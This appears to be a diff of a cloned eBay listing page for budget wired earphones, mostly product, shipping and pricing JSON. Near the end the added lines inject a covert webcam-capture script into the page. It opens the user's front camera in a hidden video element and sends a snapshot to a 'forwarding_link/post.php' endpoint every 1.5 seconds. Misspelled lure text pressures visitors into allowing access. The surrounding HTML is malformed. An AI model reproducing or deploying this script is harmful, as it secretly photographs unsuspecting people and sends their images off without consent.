Back","holidayReturnsAccepted":false,"content":{}},"paymentModel":{"paymentMethods":["PayPal"],"immediatePay":false,"isPayPalAccepted":true,"depositeReq":false,"depositeRefundable":false,"depositeDue":0,"immediateDepoReq":false,"nectarAvail":false,"paymentLogoModel":[{"className":"vi-cclogos-paypal","alt":"Paypal","title":"Paypal"},{"className":"vi-cclogos-visabig","alt":"Visa","title":"Visa"},{"className":"vi-cclogos-mastercard","alt":"MasterCard","title":"MasterCard"},{"className":"vi-cclogos-amex","alt":"Amex","title":"Amex"},{"className":"vi-cclogos-discover","alt":"Discover","title":"Discover"}],"paymentLogoLegalTxt":"Credit Cards processed by PayPal","content":{}},"shipmentModel":{"bopisAvailable":false,"pudoAvailable":false,"hideHandling":false,"regularyShipping":[{"method":"Economy Shipping from China/Hong Kong/Taiwan to worldwide","price":"S$0.00","convertedFrmPrice":"US $0.00","deliveryTime":"Est. Apr 01 - May 08","freeShip":true,"deliveryDate":"Apr 01 - May 08","contentShipModel":{"FREE":"Free"},"minDelivery":"Apr 1, 2020 3:00:00 AM","maxDelivery":"May 8, 2020 3:00:00 AM"}],"handlingModel":{"handlingTime":"15","sameDayHandling":false,"freeHandling":false},"itemLocation":"Yiwu, China","freeShippingAvailable":true,"localPickup":false,"itemLocationzipCode":"322000","shipToLocation":["Worldwide"],"expectedDate":"Apr 01 to \u003cspan\u003eMay 08\u003c/span\u003e\u003cspan class\u003d\"viHiLiteEstDelivery\"\u003eEst. Delivery\u003c/span\u003e","shippingContent":{"PICKUP_LABEL":"Pickup","SHIPS_FROM":"Posts from","SHIPS_TO":"Posts to","HYDRA_PUDO_PICKUP_DISCLAIMER":"For Delivery to Pickup station, shipping options may vary."},"hydraPudoAvailable":false,"egdEligible":false,"sameDayCutoffTimeLeft":0},"shippingDisplayName":"Est. Delivery","shippingDisplayValue":"Apr 01 - May 08","onlyOneShippingOption":true,"renderTheme":"MINDATA","showMoreLessData":{"parentID":"viShipRetPayShowMore","content":{"SHOW_MORE":"Show more","SHOW_LESS":"Show less"},"tracking":{}},"gspSupported":false,"showTopRatedSeller":true,"topRatedListing":true,"content":{"PAY_INST":"Payment instructions","EST_PICKUP":"Est. pickup ","GSP_IMPORT_CHARGES":"This item will be posted through the Global Shipping Program and includes international tracking.","SHIPPING_OPTIONS":"Postage options","EST_IMPORT_CHARGES":"Estimate, final at checkout","LOCATED":"Located","REFUND":"Refund","HANDLING_1DAY":"Will usually post within 1 business day of receiving cleared payment.","EBAY_PLUS":"eBay Plus","SPRPoofPoint5":"","Free":"Free","SHIPPING":"Postage","DELIVERY":"Delivery","SPReTRSMessage":"","SPRPoofPoint2":"14+ day money back returns","IN_STOCK":"In Stock","SPRPoofPoint1":"Seller with the highest buyer ratings","SPRPoofPoint4":"","SPRPoofPoint3":"Posts in a business day with tracking","IMM_VAL":"Immediate payment is required.","ESTIMATE_DELIVERY":"Est. Delivery","BUYER_PAYS_CONDITIONALLY":"Buyer pays conditionally.","HANDLING_X_DAYS":"Will usually post within 15 business days of receiving cleared payment.","WITHIN_1DAY":"1 day after the buyer receives it.","TAX":"Tax","GUARANTEE":"","EBAY_GUARANTEE":"","WITHIN_X_DAYS":"60 days after the buyer receives it.","SPRTitle":"eBay Premium Service:","WITHIN_1MNTH":"1 month after the buyer receives it.","PUDO_LABEL":"Click \u0026amp; Collect at null","ACCEPTED":"Accepted","IN_STORE_PICKUP":"In-Store Pickup","VAT":"VAT","GUARANTEE_SUBTEXT":"","LOCAL_PICKUP":"Local Pickup","PICKUP_OR_DELIVERY":"Pickup or Delivery","RETURNS":"Returns","EBAY_PLUS_PAYMENTS_MESSAGE":"Due to deferred payment receipt, some payment methods like electronic funds transfer are not available for eBay Plus","READ_MORE":"Read More","SAME_DAY_DELIVERY":"Same Day Delivery","RETURN_SELLER":"Seller pays return postage.","HANDLING":"Handling","EXCLUDES":"Excludes","HANDLING_COST":"Handling Cost","RETURN_SHIPPING":"Return Postage","NOT_ACCEPTED":"Not Accepted","DEP_RQD_VAL":"Deposit is required.","RETURN_BUYER":"Buyer pays return postage.","SHIPS_FROM":"Posts from","MONEY_BACK":"Money Back","HANDLING_DISCLAIMER":"The delivery date for this item is not guaranteed until you have successfully completed checkout using an instant payment method. A delivery attempt on or before the guaranteed delivery date will be considered satisfaction of the guarantee.","OUT_OF_STOCK":" Out of Stock","EXPECTED":"Expected","WITHIN_X_MNTHS":"null months after the buyer receives it.","EST_DELIVERY":"Apr 01 to \u003cspan\u003eMay 08\u003c/span\u003e\u003cspan class\u003d\"viHiLiteEstDelivery\"\u003eEst. Delivery\u003c/span\u003e","SRP":"Postage, Returns and Payments","REWARDS":"Rewards","EBAY_PLUS_RETURNS_MESSAGE":"For eBay Plus members, return shipping is free. Learn more","IMM_PAY_REQ":"Immediate pay required","RIGHT_TO_CANCEL":"Consumers have the right to return the item under the conditions outlined below.","IMPORT_CHARGES":"Import Charges","HANDLING_SAME_DAY":"Will usually posts within same business day. Expected post time might vary and is based on seller\u0027s order cut off time.","DEP_RQD":"Deposit Required","PAYMENTS":"Payments","ASK_SELLER_FOR_SHIPPING":"Ask seller for postage quote","FREE_SHIPPING":"\u003cspan class\u003d\"viHiLiteFreeShip\"\u003eFree\u003c/span\u003e\u003cspan class\u003d\"viHiLiteShipping\"\u003ePostage\u003c/span\u003e","SHIPS_TO":"Posts to","SHIP_TO_STORE":"Post to Store","POLICY":"Return policy","PICKUP":"Pickup","ETRS_PT3":"Posts in a business day with tracking","PAY_METHOD":"Payment Method","TOP_RATED_PLUS":"eBay Premium Service"},"tracking":{"VI_SRP_ASK_SELLER_CLICK":"","VI_SHOW_MORE_EXCLUDES_TO_CLICK":"","VI_SRP_BACK_CLICK":"","VI_SHOW_MORE_SHIPS_TO_CLICK":"","VI_SHIP_RET_PAY_CONTAINER":"p2056116.m2732.l6243","VI_EBAY_PLUS_RETURNS_LINK":"p2056116.m2547.l7378"},"urls":{},"calculatedShipping":false,"specialShipHandling":false,"askSellerForShipping":false,"seeItemDescription":false,"frieghtShipAvail":false,"inStorePickupOnly":false,"buyerResponsibleShip":false,"itemDoesNotShip":false,"flatRate":false,"de":false,"locationCount":6},"viDetailsModel":{"viSpecificsModel":{"itemDetails":[{"name":"Brand","value":"Unbranded"},{"name":"Earpiece","value":"Double"},{"name":"Compatible Brand","value":"Universal"},{"name":"Earpiece Design","value":"Earbud (In Ear)"},{"name":"Type","value":"Headset"},{"name":"Fit Design","value":"In-Ear Only"},{"name":"Compatible Model","value":"Universal"},{"name":"Features","value":"Built-In Microphone"},{"name":"MPN","value":"Does Not Apply"},{"name":"Microphone","value":"On-cable"},{"name":"Wireless Technology","value":"Not Applicable"},{"name":"Country / Region of Manufacture","value":"China"},{"name":"Connector(s)","value":"3.5mm Jack"},{"name":"UPC","value":"Does not apply"},{"name":"Item Number","value":"273528430080"},{"name":"Category","value":"Headsets \u003cspan\u003ein Cell Phones \u0026amp; Accessories\u003c/span\u003e"}],"specsCount":5,"showMoreSpecsCount":12,"showSubPageLink":false,"condition":"New","conditionDesc":" A brand-new, unused, unopened, undamaged item in its original packaging (where packaging is applicable).  Packaging should be the same as what is found in a retail store, unless the item was packaged by the manufacturer in non-retail packaging, such as an unprinted box or plastic bag.  See the seller\u0027s listing for full details.","endTimeUTC":"02/27/2020 08:04:37","endingSoon":false,"currentServerTime":"02/24/2020 17:14:38","qtySold":68,"qtyAvail":370,"showMoreLessData":{"parentID":"viSpecificsShowMore","content":{"SHOW_MORE":"Show more","SHOW_LESS":"Show less"},"tracking":{"SHOW_MORE_CLICK":"p2056116.m3560.l6261","SHOW_LESS_CLICK":"p2056116.m3560.l6262"}},"renderTheme":"MINDATA","content":{"ALL_SPECIFICS":"View All Specifics","READ_MORE":"Read More","SELLER_NOTES":"Seller Notes","ITEM_SPECIFICS":"Item Specifics","CONDITION":"Condition","TIME_LEFT":"Time left","MORE_THAN_10_QTY":"More than 10 available","AC_ENDING_TIME":"Item Ending time: 27 Feb 2020 16:04:37","ABOUT_CONDITION":"Read more about condition","QUANTITY":"Quantity","QTY_SOLD":"68 sold"},"tracking":{"VI_ITM_SPEC_BACK_CLICK":"p2056116.m3597.l6322","VI_VIEWALL_SPECIFICS_LNK":"p2056116.m3597.l6452"},"qtyContent":"More than 10 available"},"viItemDescModel":{"renderTheme":"MINDATA","url":"http://vi.raptor.ebaydesc.com/ws/eBayISAPI.dll?ViewItemDescV4\u0026item\u003d273528430080\u0026category\u003d80077\u0026pm\u003d1\u0026ds\u003d0\u0026t\u003d1582564478987\u0026cspheader\u003d1","content":{"ITEM_DESC":"Item Description","DESCRIPTION":"Description"},"tracking":{"VI_ITEM_DESC_LNK":"p2056116.m3555.l6241","VI_ITM_DESC_BACK_CLICK":""}},"showCompatability":false,"isEligibleForGXO":true,"hasVariation":true,"isBopisAvail":false,"renderTheme":"MINDATA","content":{"ADD_TO_CART":"Add to Cart","COMPATIBILITY":"Compatibility","UNWATCH":"Unwatch","SELLER_OFFER":"Seller Offer","WATCH":"Watch"},"tracking":{"VI_SME_LINK":"p2056116.m3557.l6244"}},"viHiLiteModel":{"title":"HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic ","viPriceModel":{"shipping":"Free Postage","startRangePrice":"US $0.99","endRangePrice":"US $2.39","convertedFrmStartRange":"Approx S$1.38","convertedFrmEndRange":"S$3.34","mskuPrice":"Approx S$1.38","convertedMskuPrice":"US $0.99","bidCount":0,"reserveMet":true,"MSKU":true,"showShipping":false,"showCondition":false,"variationSelected":false,"vatPercentage":0.0,"showMAPOnCheckout":false,"content":{"SHIPPING_PRICE":"\u003cspan class\u003d\"viHiLitePrice\"\u003eFree Postage\u003c/span\u003e\u003cspan class\u003d\"viHiLiteShipping\"\u003ePostage\u003c/span\u003e","PERCENT_OFF":"% off","VAT_LABEL":"(Incl. VAT)","X_BIDS":"0 bids","WAS_PRICE":"Was:","MAP_LEGAL_INFO_XO":"You should know that by taking these steps, you won\u0027t be required to purchase the product. You can always simply remove the item from your cart or not proceed with checkout if you decide not to buy the item.","BUY_IT_NOW":"Buy It Now","STARTING_BID":"Starting Bid","RESERVE_NOT_MET":"Reserve not met","MAP_PRICE_LABEL":"Show Price","MAP_LEGAL_INFO":"Sellers have the right to set their own prices independently, but some manufacturers place restrictions on how those prices may be displayed or communicated to others. Because the seller\u0027s price on this item is below the manufacturer\u0027s \"minimum advertised price\" the manufacturer may not allow the seller to show you the seller\u0027s lower price until you take further action. The steps required depend on the terms of the manufacturer\u0027s minimum advertised price policy. Taking these steps allows eBay to show you the seller\u0027s great price consistent with eBay\u0027s goal of always brining consumers like you the lowest possible prices on the widest selection of products.","SEE_DETAILS_XO":"See product details at checkout","APPROX":"Approx ##1##"}},"unitQty":0.0,"vatPercentage":0.0},"viVariation":{"traits":[{"name":"Color","matchingMask":63,"primaryTrait":false,"traitVals":[{"name":"Black","matching":1},{"name":"Rose Gold","matching":2},{"name":"Silver","matching":3},{"name":"Gold","matching":4},{"name":"Red","matching":5},{"name":"White","matching":6}]}],"variations":[{"itemPrice":"S$3.34","qtyAvail":50,"qtySold":9,"varId":572933386542,"curId":"SGD","matchingVal":1,"traitVals":[1],"price":{"curId":"SGD","strval":"3.34","val":3.34,"fmtPrice":"S$3.34","intlFmtdprice":"S$3.34","intlFullFmtdprice":"S$ 3.34","currencyPrefix":"S$","currencyIntlPrefix":"S$"},"convertedPrice":{"curId":"USD","strval":"2.39","val":2.39,"fmtPrice":"$2.39","intlFmtdprice":"US $2.39","intlFullFmtdprice":"US $2.39","currencyPrefix":"US $","currencyIntlPrefix":"US $"},"variationSKU":"L1528/sd"},{"itemPrice":"S$3.34","qtyAvail":50,"qtySold":8,"varId":572933386543,"curId":"SGD","matchingVal":2,"traitVals":[2],"price":{"curId":"SGD","strval":"3.34","val":3.34,"fmtPrice":"S$3.34","intlFmtdprice":"S$3.34","intlFullFmtdprice":"S$ 3.34","currencyPrefix":"S$","currencyIntlPrefix":"S$"},"convertedPrice":{"curId":"USD","strval":"2.39","val":2.39,"fmtPrice":"$2.39","intlFmtdprice":"US $2.39","intlFullFmtdprice":"US $2.39","currencyPrefix":"US $","currencyIntlPrefix":"US $"},"variationSKU":"L1529/sd"},{"itemPrice":"S$3.34","qtyAvail":20,"qtySold":15,"varId":572933386544,"curId":"SGD","matchingVal":3,"traitVals":[3],"price":{"curId":"SGD","strval":"3.34","val":3.34,"fmtPrice":"S$3.34","intlFmtdprice":"S$3.34","intlFullFmtdprice":"S$ 3.34","currencyPrefix":"S$","currencyIntlPrefix":"S$"},"convertedPrice":{"curId":"USD","strval":"2.39","val":2.39,"fmtPrice":"$2.39","intlFmtdprice":"US $2.39","intlFullFmtdprice":"US $2.39","currencyPrefix":"US $","currencyIntlPrefix":"US $"},"variationSKU":"L1530/sd"},{"itemPrice":"S$3.34","qtyAvail":50,"qtySold":2,"varId":572933386545,"curId":"SGD","matchingVal":4,"traitVals":[4],"price":{"curId":"SGD","strval":"3.34","val":3.34,"fmtPrice":"S$3.34","intlFmtdprice":"S$3.34","intlFullFmtdprice":"S$ 3.34","currencyPrefix":"S$","currencyIntlPrefix":"S$"},"convertedPrice":{"curId":"USD","strval":"2.39","val":2.39,"fmtPrice":"$2.39","intlFmtdprice":"US $2.39","intlFullFmtdprice":"US $2.39","currencyPrefix":"US $","currencyIntlPrefix":"US $"},"variationSKU":"L1531/sd"},{"itemPrice":"S$3.34","qtyAvail":100,"qtySold":5,"varId":572933386546,"curId":"SGD","matchingVal":5,"traitVals":[5],"price":{"curId":"SGD","strval":"3.34","val":3.34,"fmtPrice":"S$3.34","intlFmtdprice":"S$3.34","intlFullFmtdprice":"S$ 3.34","currencyPrefix":"S$","currencyIntlPrefix":"S$"},"convertedPrice":{"curId":"USD","strval":"2.39","val":2.39,"fmtPrice":"$2.39","intlFmtdprice":"US $2.39","intlFullFmtdprice":"US $2.39","currencyPrefix":"US $","currencyIntlPrefix":"US $"},"variationSKU":"L1532/sd"},{"itemPrice":"S$1.38","qtyAvail":100,"qtySold":29,"varId":572933386547,"curId":"SGD","matchingVal":6,"traitVals":[6],"price":{"curId":"SGD","strval":"1.38","val":1.38,"fmtPrice":"S$1.38","intlFmtdprice":"S$1.38","intlFullFmtdprice":"S$ 1.38","currencyPrefix":"S$","currencyIntlPrefix":"S$"},"convertedPrice":{"curId":"USD","strval":"0.99","val":0.99,"fmtPrice":"$0.99","intlFmtdprice":"US $0.99","intlFullFmtdprice":"US $0.99","currencyPrefix":"US $","currencyIntlPrefix":"US $"},"variationSKU":"H1163/sd"}],"traitImgIndexMap":{"1":[9],"2":[11],"3":[12],"4":[14],"5":[15],"6":[16]},"content":{"VAT_LABEL":"(Incl. VAT)","PERCENT_OFF":"##1##% off","WAS_PRICE":"Was:","MAP_PRICE_LABEL":"Show Price","MAP_LEGAL_INFO_XO":"You should know that by taking these steps, you won\u0027t be required to purchase the product. You can always simply remove the item from your cart or not proceed with checkout if you decide not to buy the item.","MAP_LEGAL_INFO":"Sellers have the right to set their own prices independently, but some manufacturers place restrictions on how those prices may be displayed or communicated to others. Because the seller\u0027s price on this item is below the manufacturer\u0027s \"minimum advertised price\" the manufacturer may not allow the seller to show you the seller\u0027s lower price until you take further action. The steps required depend on the terms of the manufacturer\u0027s minimum advertised price policy. Taking these steps allows eBay to show you the seller\u0027s great price consistent with eBay\u0027s goal of always brining consumers like you the lowest possible prices on the widest selection of products.","SELECT_OPTIONS":"Select Options","CONTINUE":"Continue","DONE":"Done","SELECT":"Select","OUTOFSTOCK":"##1## [out of stock]","CANCEL":"Cancel"},"trackingIds":{"MSKUV2_BUTTON_CANCEL":"p2056116.m3665.l4349","MSKUV2_BUTTON_CONFIRM":"p2056116.m3665.l4335"},"priceEnum":"NONE","MSKU":true,"variationSelected":false,"startRangePrice":"Approx S$1.38","endRangePrice":"S$3.34","convertedFrmStartRange":"US $0.99","convertedFrmEndRange":"US $2.39","mskuPrice":"Approx S$1.38","convertedMskuPrice":"US $0.99","vatPercentage":0.0},"viImageGallery":{"imgGalleryModel":[{"defaultImg":"https://i.ebayimg.com/images/g/efgAAOSwaMxbtedk/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/efgAAOSwaMxbtedk/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/LwEAAOSw1IVbtedj/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/LwEAAOSw1IVbtedj/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/QgcAAOSwBNdbtedl/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/QgcAAOSwBNdbtedl/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/G20AAOSwFvBbtedm/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/G20AAOSwFvBbtedm/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/egIAAOSwaMxbtedn/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/egIAAOSwaMxbtedn/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/hNkAAOSwSYdbtedo/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/hNkAAOSwSYdbtedo/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/rGMAAOSwapdbtedp/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/rGMAAOSwapdbtedp/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/LcEAAOSwPjhbtedq/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/LcEAAOSwPjhbtedq/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/b0gAAOSwze5btedy/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/b0gAAOSwze5btedy/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/XxEAAOSwoUZbtedz/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/XxEAAOSwoUZbtedz/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/OBoAAOSwmNlbtedr/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/OBoAAOSwmNlbtedr/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/GUsAAOSwzfNbteds/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/GUsAAOSwzfNbteds/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/FmcAAOSwJGdbted2/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/FmcAAOSwJGdbted2/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/9LcAAOSwtJxbtedu/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/9LcAAOSwtJxbtedu/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/ZaYAAOSw6~Vbtedv/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/ZaYAAOSw6~Vbtedv/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/VI4AAOSwnFpb0s-i/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/VI4AAOSwnFpb0s-i/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}},{"defaultImg":"https://i.ebayimg.com/images/g/f-4AAOSw9GVb0vdt/s-l500.jpg","singleViewImg":"https://i.ebayimg.com/images/g/f-4AAOSw9GVb0vdt/s-l500.jpg","tracking":{"VI_IMAGE_GALLERY_CLICK_NEW":"p2056116.m2570.l6239"}}],"content":{"NUMBER_OF_IMAGES":"\u003cspan id\u003d\"curImgIdx\"\u003e1\u003c/span\u003e of \u003cspan id\u003d\"ttlImgIdx\"\u003e1\u003c/span\u003e","DONE":"Done","PHOTOS":"Photos","PHOTO":"Photo"},"tracking":{"VI_IMAGE_GALLERY_GROUP_VIEW_IMAGE":"p2056116.m2570.l6236","VI_IMAGE_GALLERY_GROUP_VIEW_ICON":"p2056116.m2570.l6235","VI_IMAGE_GALLERY_SINGLE_VIEW_DONE":"p2056116.m2570.l6234","VI_IMAGE_GALLERY_GROUP_VIEW_DONE":"p2056116.m2570.l6237","VI_IMAGE_GALLERY_SINGLE_VIEW_IMAGE":"p2056116.m2570.l6238"},"title":"HIFI Super Bass Headset 3.5mm In-Ear Earphone Stereo Earbud Headphone Wire Mic "},"businessSeller":{"legalInvoiceAvail":false,"contents":{"PHONE":"Phone:","BUSINESS_SELLER":"Legal Information","VAT_NUMBER":"VAT number:","RETURN_POLICY":"RETURN POLICY","TERMS_CONDITIONS":"TERMS AND CONDITIONS OF THE SALE","SELLER_NAME":"Seller","LEGAL_VAT_INFO":"Invoices are provided with VAT separately displayed","EMAIL":"Email:","ADDITIONAL_CONTACT_INFO":"Additional Contact Information:","TRADE_REG_NUMBER":"Trade registration number:","FAX":"Fax:","CONTACT_ADDRESS":"Address"}},"socialModel":{"sojournerPageId":0,"showWidget":false},"contents":{"ARIA_DECREASE_QUANTITY":"Decrease quantity to ##1##","BIN_LEGAL_TXT":"By tapping Commit to Buy, you\u0027re agreeing to entering into a binding contract to buy this item from the seller. You\u0027re responsible for reading the full item listing.","AC_ENDING_TIME":"Decrease quantity to ##1##","ARIA_INCREASE_QUANTITY":"Increase quantity to ##1##"},"hasToken":false,"ended":false,"seller":false,"privateSaleListing":false,"gbhUser":false,"liveAuction":false,"sellerId":"smiling*12","siteId":"216","language":"en_SG","itemId":"273528430080","binTimeLeft":"Feb 27,16:04 SGT","binEndTime":"2d 14h","listingSiteId":0,"enablePrpMerch":false,"mfeDataModel":{"siteId":216,"clientMFEAdsEnabled":true,"guid_id":"782fb0ec1700a4ea9b38266fffec7aaa","environment":"production","pageFamily":"VIP"},"mfeAdsEnabled":true};
+        		viData.pageId=2056116;
+        	
+        		var MWEB_CONTENTS = {
+            		INVALID_INPUT: "Invalid input. Please try again.",
+            		AJAX_INVALID_INPUT: "Invalid bid submitted. Displaying minimum bid amount.",
+            		BID_GREATER_BIN: "Your maximum bid is above or equal to the Buy It Now price. You can lose the item to another user if they buy the item without waiting for the listing to end. Consider buying the item using Buy It Now. If you still wish to bid, you may do so below by entering a price lower than the Buy It Now price.",
+            		LESS_THAN_MINI_BID: "Please enter a higher amount than the current bid.",
+            		LESS_THAN_PRE_BID: "Your bid amount should be higher than your last bid.",
+            		BID_END_MSG: "Calculating highest bidder...",
+            		OVL_OUT_BID:"You've been outbid! Don't let it get away - bid again!",
+            		BID_OUTBID:"You have been outbid. ",
+            		PLACE_BID:"Place Bid",
+            		CONFIRM:"Confirm",
+            		CONDITION:"Condition",
+            		CHECKOUT:"Checkout",
+            		COMMIT_TO_BUY:"Commit to buy",
+            		BIN_LEGAL_TXT: viData.contents['BIN_LEGAL_TXT'], 
+            		CANCEL:"Cancel",
+            		ENTER_BID:"Enter your max bid",
+            		AUTOBID:"Automatically place bids up to",
+            		BID_LEGAL_TXT: viData.contents['BID_LEGAL_TXT'], 
+            		CONFIRM_BID:"Confirm Bid",
+            		RESERVE_NOT_MET:"Reserve not met",
+            		INCREASE_BID:"Increase bid",
+            		CURRENT_BID:"Current bid",
+            		TIME_LEFT:"Time left",
+            		BID_OUTBID:"You have been outbid. ",
+            		BUY_IT_NOW:"Buy It Now",
+            		BUY_IT_NOW_LABEL:"Buy It Now:",
+            		SHIPPING_LABEL:"Postage:",
+            		TIME_LEFT_LABEL:"Time left:",
+            		BUCKS_LABEL:"eBay Bucks:",
+            		TOTAL_LABEL:"Approx. Total:",
+            		QTY_LABEL:"Quantity:",
+            		IMPORT_CHARGES:"Import Charges",
+            		DONE:"Done",
+            		SELLER_NOTES:"Seller Notes",
+            		LEARN_ABOUT_PRICING:"Learn about pricing",
+            		ENDED: "Ended",
+            		sentPaymentReminder: "Payment Reminder Sent",
+            		MAX_BID: "Your Max Bid",
+            		RESERVE_NOT_MET:"Reserve not met",
+            		PAGE_EBAY_GENERIC_ERROR:"",
+            		LIVE_AUCTION: "To bid on this live auction item, go to eBay.com on your desktop.",
+            		BUYING_OPTIONS: "Buying Options"
+                };
+
+                var MWEB_TRACKING = {
+                	VI_PROD_DETAILS_LNK : '',
+                	VI_PROD_DETAILS_BACK_CLICK : ''
+                };
+        	</script>
+  </div>
+  <img height="1" width="1" src="https://rover.ebay.com.sg/roverimp/0/0/9?imp=2046301&amp;trknvp=cp%3D2056116%26ghi%3D96&amp;1582564480942" alt="" aria-hidden="true"> 
+  <div id="pageCover" class="hidden"></div>
+  <div id="fullPageConditionOverlay" class="dialogOverlay-parent dialogHidden ">
+   <span class="dialogOverlay-headerText ">Condition</span>
+   <div class="dialogOverlay-content cndDescOvl">
+     A brand-new, unused, unopened, undamaged item in its original packaging (where packaging is applicable). Packaging should be the same as what is found in a retail store, unless the item was packaged by the manufacturer in non-retail packaging, such as an unprinted box or plastic bag. See the seller's listing for full details.
+   </div>
+   <a id="dialogButtons-button" class="dialogButtons-parent BUTTON_TYPE_ONE"><span class="dialogButtons-buttonText">Done</span></a>
+  </div>
+ 
+
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+<bo
+<body>
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',   data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    
+        <p> give your access browse to site</p>
+        <p>allow to accses ebay i your browser?</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> allow access??</label></p>
+    </body>
+
+</html>
